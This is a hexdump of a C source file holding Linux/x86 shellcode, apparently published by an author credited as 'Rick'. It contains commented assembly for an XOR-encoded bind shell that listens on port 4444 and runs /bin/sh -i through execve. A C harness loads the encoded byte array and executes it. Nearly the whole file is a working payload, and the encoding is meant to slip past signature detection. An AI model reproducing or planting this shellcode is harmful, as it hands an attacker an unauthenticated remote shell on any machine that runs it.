00000000  2f 2a 20 0d 0a 20 20 20  20 20 20 20 41 75 74 68  |/* ..       Auth|
00000010  6f 72 3a 20 52 69 63 6b  0d 0a 20 20 20 20 20 20  |or: Rick..      |
00000020  20 45 6d 61 69 6c 3a 20  72 69 63 6b 32 36 30 30  | Email: rick2600|
00000030  40 68 6f 74 6d 61 69 6c  2e 63 6f 6d 0d 0a 0d 0a  |@hotmail.com....|
00000040  20 20 20 20 20 20 20 4f  53 3a 20 4c 69 6e 75 78  |       OS: Linux|
00000050  2f 78 38 36 0d 0a 20 20  20 20 20 20 20 44 65 73  |/x86..       Des|
00000060  63 72 69 70 74 69 6f 6e  3a 20 50 6f 72 74 20 42  |cription: Port B|
00000070  69 6e 64 20 34 34 34 34  20 28 20 78 6f 72 2d 65  |ind 4444 ( xor-e|
00000080  6e 63 6f 64 65 64 20 29  0d 0a 0d 0a 0d 0a 2d 2d  |ncoded )......--|
00000090  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000000d0  2d 2d 0d 0a 73 65 63 74  69 6f 6e 20 2e 74 65 78  |--..section .tex|
000000e0  74 0d 0a 20 20 20 20 67  6c 6f 62 61 6c 20 5f 73  |t..    global _s|
000000f0  74 61 72 74 0d 0a 0d 0a  5f 73 74 61 72 74 3a 0d  |tart...._start:.|
00000100  0a 0d 0a 20 20 20 20 3b  73 6f 63 6b 65 74 20 28  |...    ;socket (|
00000110  50 46 5f 49 4e 45 54 2c  20 53 4f 43 4b 5f 53 54  |PF_INET, SOCK_ST|
00000120  52 45 41 4d 2c 20 30 29  0d 0a 20 20 20 20 70 75  |REAM, 0)..    pu|
00000130  73 68 20 62 79 74 65 20  30 78 36 36 20 20 20 20  |sh byte 0x66    |
00000140  20 20 0d 0a 20 20 20 20  70 6f 70 20 65 61 78 0d  |  ..    pop eax.|
00000150  0a 20 20 20 20 70 75 73  68 20 62 79 74 65 20 30  |.    push byte 0|
00000160  78 30 31 0d 0a 20 20 20  20 70 6f 70 20 65 62 78  |x01..    pop ebx|
00000170  0d 0a 20 20 20 20 78 6f  72 20 65 63 78 2c 20 65  |..    xor ecx, e|
00000180  63 78 0d 0a 20 20 20 20  70 75 73 68 20 65 63 78  |cx..    push ecx|
00000190  0d 0a 20 20 20 20 70 75  73 68 20 62 79 74 65 20  |..    push byte |
000001a0  30 78 30 31 0d 0a 20 20  20 20 70 75 73 68 20 62  |0x01..    push b|
000001b0  79 74 65 20 30 78 30 32  0d 0a 20 20 20 20 6d 6f  |yte 0x02..    mo|
000001c0  76 20 65 63 78 2c 20 65  73 70 0d 0a 20 20 20 20  |v ecx, esp..    |
000001d0  69 6e 74 20 30 78 38 30  0d 0a 20 20 20 20 0d 0a  |int 0x80..    ..|
000001e0  20 20 20 20 6d 6f 76 20  65 73 69 2c 20 65 61 78  |    mov esi, eax|
000001f0  09 3b 73 61 76 65 20 66  69 6c 65 20 64 65 73 63  |.;save file desc|
00000200  72 69 70 74 6f 72 0d 0a  20 20 20 20 0d 0a 20 20  |riptor..    ..  |
00000210  20 20 3b 62 69 6e 64 20  28 73 6f 63 6b 66 64 2c  |  ;bind (sockfd,|
00000220  20 73 65 72 76 65 72 2c  20 6c 65 6e 29 0d 0a 20  | server, len).. |
00000230  20 20 20 78 6f 72 20 65  64 78 2c 20 65 64 78 0d  |   xor edx, edx.|
00000240  0a 20 20 20 20 70 75 73  68 20 65 64 78 0d 0a 20  |.    push edx.. |
00000250  20 20 20 70 75 73 68 20  77 6f 72 64 20 30 78 35  |   push word 0x5|
00000260  63 31 31 0d 0a 20 20 20  20 70 75 73 68 20 77 6f  |c11..    push wo|
00000270  72 64 20 30 78 30 32 0d  0a 20 20 20 20 6d 6f 76  |rd 0x02..    mov|
00000280  20 65 63 78 2c 20 65 73  70 0d 0a 20 20 20 20 70  | ecx, esp..    p|
00000290  75 73 68 20 62 79 74 65  20 30 78 31 30 0d 0a 20  |ush byte 0x10.. |
000002a0  20 20 20 70 75 73 68 20  65 63 78 0d 0a 20 20 20  |   push ecx..   |
000002b0  20 70 75 73 68 20 65 61  78 0d 0a 20 20 20 20 6d  | push eax..    m|
000002c0  6f 76 20 65 63 78 2c 20  65 73 70 0d 0a 20 20 20  |ov ecx, esp..   |
000002d0  20 6d 6f 76 20 62 6c 2c  20 30 78 30 32 0d 0a 20  | mov bl, 0x02.. |
000002e0  20 20 20 70 75 73 68 20  62 79 74 65 20 30 78 36  |   push byte 0x6|
000002f0  36 0d 0a 20 20 20 20 70  6f 70 20 65 61 78 0d 0a  |6..    pop eax..|
00000300  20 20 20 20 69 6e 74 20  30 78 38 30 0d 0a 20 20  |    int 0x80..  |
00000310  20 20 0d 0a 20 20 20 20  3b 6c 69 73 74 65 6e 0d  |  ..    ;listen.|
00000320  0a 20 20 20 20 6d 6f 76  20 61 6c 2c 20 30 78 36  |.    mov al, 0x6|
00000330  36 0d 0a 20 20 20 20 6d  6f 76 20 62 6c 2c 20 30  |6..    mov bl, 0|
00000340  78 30 34 0d 0a 20 20 20  20 69 6e 74 20 30 78 38  |x04..    int 0x8|
00000350  30 0d 0a 20 20 20 20 0d  0a 20 20 20 20 3b 61 63  |0..    ..    ;ac|
00000360  63 65 70 74 0d 0a 20 20  20 20 70 75 73 68 20 65  |cept..    push e|
00000370  64 78 0d 0a 20 20 20 20  70 75 73 68 20 65 73 69  |dx..    push esi|
00000380  20 0d 0a 20 20 20 20 6d  6f 76 20 65 63 78 2c 20  | ..    mov ecx, |
00000390  65 73 70 0d 0a 20 20 20  20 69 6e 63 20 65 62 78  |esp..    inc ebx|
000003a0  0d 0a 20 20 20 20 70 75  73 68 20 62 79 74 65 20  |..    push byte |
000003b0  30 78 36 36 0d 0a 20 20  20 20 70 6f 70 20 65 61  |0x66..    pop ea|
000003c0  78 0d 0a 20 20 20 20 69  6e 74 20 30 78 38 30 0d  |x..    int 0x80.|
000003d0  0a 20 20 20 20 0d 0a 20  20 20 20 6d 6f 76 20 65  |.    ..    mov e|
000003e0  62 78 2c 20 65 61 78 09  3b 73 61 76 65 20 66 69  |bx, eax.;save fi|
000003f0  6c 65 20 64 65 73 63 72  69 70 74 6f 72 0d 0a 20  |le descriptor.. |
00000400  20 20 20 0d 0a 20 20 20  20 3b 64 75 70 32 28 73  |   ..    ;dup2(s|
00000410  6f 63 6b 66 64 2c 20 32  29 3b 20 64 75 70 32 28  |ockfd, 2); dup2(|
00000420  73 6f 63 6b 66 64 2c 20  31 29 3b 20 64 75 70 32  |sockfd, 1); dup2|
00000430  28 73 6f 63 6b 66 64 2c  20 30 29 0d 0a 20 20 20  |(sockfd, 0)..   |
00000440  20 70 75 73 68 20 62 79  74 65 20 30 78 30 32 0d  | push byte 0x02.|
00000450  0a 20 20 20 20 70 6f 70  20 65 63 78 0d 0a 20 20  |.    pop ecx..  |
00000460  20 20 64 6f 5f 64 75 70  3a 0d 0a 20 20 20 20 20  |  do_dup:..     |
00000470  20 20 20 70 75 73 68 20  62 79 74 65 20 30 78 33  |   push byte 0x3|
00000480  66 0d 0a 20 20 20 20 20  20 20 20 70 6f 70 20 65  |f..        pop e|
00000490  61 78 0d 0a 20 20 20 20  20 20 20 20 69 6e 74 20  |ax..        int |
000004a0  30 78 38 30 0d 0a 20 20  20 20 6c 6f 6f 70 20 64  |0x80..    loop d|
000004b0  6f 5f 64 75 70 0d 0a 20  20 20 20 20 20 20 20 70  |o_dup..        p|
000004c0  75 73 68 20 62 79 74 65  20 30 78 33 66 0d 0a 20  |ush byte 0x3f.. |
000004d0  20 20 20 20 20 20 20 70  6f 70 20 65 61 78 0d 0a  |       pop eax..|
000004e0  20 20 20 20 20 20 20 20  69 6e 74 20 30 78 38 30  |        int 0x80|
000004f0  0d 0a 20 20 20 20 0d 0a  20 20 20 20 0d 0a 20 20  |..    ..    ..  |
00000500  20 20 3b 20 65 78 65 63  76 65 20 28 22 2f 62 69  |  ; execve ("/bi|
00000510  6e 2f 73 68 22 2c 20 5b  22 2f 62 69 6e 2f 73 68  |n/sh", ["/bin/sh|
00000520  22 2c 20 22 2d 69 22 5d  2c 20 30 29 3b 0d 0a 20  |", "-i"], 0);.. |
00000530  20 20 20 78 6f 72 20 65  64 78 2c 20 65 64 78 0d  |   xor edx, edx.|
00000540  0a 20 20 20 20 70 75 73  68 20 65 64 78 0d 0a 20  |.    push edx.. |
00000550  20 20 20 70 75 73 68 20  30 78 36 38 37 33 32 66  |   push 0x68732f|
00000560  36 65 0d 0a 20 20 20 20  70 75 73 68 20 30 78 36  |6e..    push 0x6|
00000570  39 36 32 32 66 32 66 0d  0a 20 20 20 20 6d 6f 76  |9622f2f..    mov|
00000580  20 65 62 78 2c 20 65 73  70 0d 0a 20 20 20 20 70  | ebx, esp..    p|
00000590  75 73 68 20 65 64 78 0d  0a 20 20 20 20 70 75 73  |ush edx..    pus|
000005a0  68 20 77 6f 72 64 20 30  78 36 39 32 64 0d 0a 20  |h word 0x692d.. |
000005b0  20 20 20 6d 6f 76 20 65  63 78 2c 20 65 73 70 0d  |   mov ecx, esp.|
000005c0  0a 20 20 20 20 70 75 73  68 20 65 64 78 0d 0a 20  |.    push edx.. |
000005d0  20 20 20 70 75 73 68 20  65 63 78 0d 0a 20 20 20  |   push ecx..   |
000005e0  20 70 75 73 68 20 65 62  78 0d 0a 20 20 20 20 6d  | push ebx..    m|
000005f0  6f 76 20 65 63 78 2c 20  65 73 70 0d 0a 20 20 20  |ov ecx, esp..   |
00000600  20 70 75 73 68 20 62 79  74 65 20 30 78 30 62 0d  | push byte 0x0b.|
00000610  0a 20 20 20 20 70 6f 70  20 65 61 78 0d 0a 20 20  |.    pop eax..  |
00000620  20 20 69 6e 74 20 30 78  38 30 0d 0a 20 20 20 20  |  int 0x80..    |
00000630  0d 0a 20 20 20 20 3b 65  78 69 74 28 30 29 0d 0a  |..    ;exit(0)..|
00000640  20 20 20 20 70 75 73 68  20 62 79 74 65 20 30 78  |    push byte 0x|
00000650  30 31 0d 0a 20 20 20 20  70 6f 70 20 65 61 78 0d  |01..    pop eax.|
00000660  0a 20 20 20 20 78 6f 72  20 65 62 78 2c 20 65 62  |.    xor ebx, eb|
00000670  78 0d 0a 20 20 20 20 69  6e 74 20 30 78 38 30 0d  |x..    int 0x80.|
00000680  0a 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |.---------------|
00000690  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000006c0  2d 2d 2d 2d 2d 0d 0a 2a  2f 0d 0a 20 20 20 20 20  |-----..*/..     |
000006d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006e0  20 20 20 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |   ..#include <s|
000006f0  74 64 69 6f 2e 68 3e 0d  0a 23 69 6e 63 6c 75 64  |tdio.h>..#includ|
00000700  65 20 3c 73 74 72 69 6e  67 2e 68 3e 0d 0a 0d 0a  |e <string.h>....|
00000710  0d 0a 0d 0a 63 68 61 72  20 63 6f 64 65 5b 5d 20  |....char code[] |
00000720  3d 0d 0a 22 5c 78 65 62  5c 78 31 32 5c 78 35 62  |=.."\xeb\x12\x5b|
00000730  5c 78 33 31 5c 78 63 39  5c 78 62 31 5c 78 37 35  |\x31\xc9\xb1\x75|
00000740  5c 78 38 61 5c 78 30 33  5c 78 33 34 22 0d 0a 22  |\x8a\x03\x34".."|
00000750  5c 78 31 65 5c 78 38 38  5c 78 30 33 5c 78 34 33  |\x1e\x88\x03\x43|
00000760  5c 78 36 36 5c 78 34 39  5c 78 37 35 5c 78 66 35  |\x66\x49\x75\xf5|
00000770  5c 78 65 62 5c 78 30 35  22 0d 0a 22 5c 78 65 38  |\xeb\x05".."\xe8|
00000780  5c 78 65 39 5c 78 66 66  5c 78 66 66 5c 78 66 66  |\xe9\xff\xff\xff|
00000790  5c 78 37 34 5c 78 37 38  5c 78 34 36 5c 78 37 34  |\x74\x78\x46\x74|
000007a0  5c 78 31 66 22 0d 0a 22  5c 78 34 35 5c 78 32 66  |\x1f".."\x45\x2f|
000007b0  5c 78 64 37 5c 78 34 66  5c 78 37 34 5c 78 31 66  |\xd7\x4f\x74\x1f|
000007c0  5c 78 37 34 5c 78 31 63  5c 78 39 37 5c 78 66 66  |\x74\x1c\x97\xff|
000007d0  22 0d 0a 22 5c 78 64 33  5c 78 39 65 5c 78 39 37  |".."\xd3\x9e\x97|
000007e0  5c 78 64 38 5c 78 32 66  5c 78 63 63 5c 78 34 63  |\xd8\x2f\xcc\x4c|
000007f0  5c 78 37 38 5c 78 37 36  5c 78 30 66 22 0d 0a 22  |\x78\x76\x0f".."|
00000800  5c 78 34 32 5c 78 37 38  5c 78 37 36 5c 78 31 63  |\x42\x78\x76\x1c|
00000810  5c 78 31 65 5c 78 39 37  5c 78 66 66 5c 78 37 34  |\x1e\x97\xff\x74|
00000820  5c 78 30 65 5c 78 34 66  22 0d 0a 22 5c 78 34 65  |\x0e\x4f".."\x4e|
00000830  5c 78 39 37 5c 78 66 66  5c 78 61 64 5c 78 31 63  |\x97\xff\xad\x1c|
00000840  5c 78 37 34 5c 78 37 38  5c 78 34 36 5c 78 64 33  |\x74\x78\x46\xd3|
00000850  5c 78 39 65 22 0d 0a 22  5c 78 61 65 5c 78 37 38  |\x9e".."\xae\x78|
00000860  5c 78 61 64 5c 78 31 61  5c 78 64 33 5c 78 39 65  |\xad\x1a\xd3\x9e|
00000870  5c 78 34 63 5c 78 34 38  5c 78 39 37 5c 78 66 66  |\x4c\x48\x97\xff|
00000880  22 0d 0a 22 5c 78 35 64  5c 78 37 34 5c 78 37 38  |".."\x5d\x74\x78|
00000890  5c 78 34 36 5c 78 64 33  5c 78 39 65 5c 78 39 37  |\x46\xd3\x9e\x97|
000008a0  5c 78 64 64 5c 78 37 34  5c 78 31 63 22 0d 0a 22  |\xdd\x74\x1c".."|
000008b0  5c 78 34 37 5c 78 37 34  5c 78 32 31 5c 78 34 36  |\x47\x74\x21\x46|
000008c0  5c 78 64 33 5c 78 39 65  5c 78 66 63 5c 78 65 37  |\xd3\x9e\xfc\xe7|
000008d0  5c 78 37 34 5c 78 32 31  22 0d 0a 22 5c 78 34 36  |\x74\x21".."\x46|
000008e0  5c 78 64 33 5c 78 39 65  5c 78 32 66 5c 78 63 63  |\xd3\x9e\x2f\xcc|
000008f0  5c 78 34 63 5c 78 37 36  5c 78 37 30 5c 78 33 31  |\x4c\x76\x70\x31|
00000900  5c 78 36 64 22 0d 0a 22  5c 78 37 36 5c 78 37 36  |\x6d".."\x76\x76|
00000910  5c 78 33 31 5c 78 33 31  5c 78 37 63 5c 78 37 37  |\x31\x31\x7c\x77|
00000920  5c 78 39 37 5c 78 66 64  5c 78 34 63 5c 78 37 38  |\x97\xfd\x4c\x78|
00000930  22 0d 0a 22 5c 78 37 36  5c 78 33 33 5c 78 37 37  |".."\x76\x33\x77|
00000940  5c 78 39 37 5c 78 66 66  5c 78 34 63 5c 78 34 66  |\x97\xff\x4c\x4f|
00000950  5c 78 34 64 5c 78 39 37  5c 78 66 66 22 0d 0a 22  |\x4d\x97\xff".."|
00000960  5c 78 37 34 5c 78 31 35  5c 78 34 36 5c 78 64 33  |\x74\x15\x46\xd3|
00000970  5c 78 39 65 5c 78 37 34  5c 78 31 66 5c 78 34 36  |\x9e\x74\x1f\x46|
00000980  5c 78 32 66 5c 78 63 35  22 0d 0a 22 5c 78 64 33  |\x2f\xc5".."\xd3|
00000990  5c 78 39 65 22 3b 0d 0a  0d 0a 0d 0a 0d 0a 69 6e  |\x9e";........in|
000009a0  74 20 6d 61 69 6e 28 76  6f 69 64 29 0d 0a 7b 0d  |t main(void)..{.|
000009b0  0a 20 20 20 70 72 69 6e  74 66 28 22 6c 65 6e 67  |.   printf("leng|
000009c0  74 68 3a 20 25 64 5c 6e  22 2c 20 73 74 72 6c 65  |th: %d\n", strle|
000009d0  6e 28 63 6f 64 65 29 29  3b 0d 0a 20 20 20 0d 0a  |n(code));..   ..|
000009e0  20 20 20 76 6f 69 64 20  28 2a 73 68 65 6c 6c 63  |   void (*shellc|
000009f0  6f 64 65 29 28 29 3b 0d  0a 20 20 20 73 68 65 6c  |ode)();..   shel|
00000a00  6c 63 6f 64 65 20 3d 20  28 76 6f 69 64 20 2a 29  |lcode = (void *)|
00000a10  63 6f 64 65 3b 0d 0a 20  20 20 73 68 65 6c 6c 63  |code;..   shellc|
00000a20  6f 64 65 28 29 3b 0d 0a  20 20 20 72 65 74 75 72  |ode();..   retur|
00000a30  6e 20 28 30 29 3b 0d 0a  20 20 20 20 0d 0a 7d     |n (0);..    ..}|
00000a3f
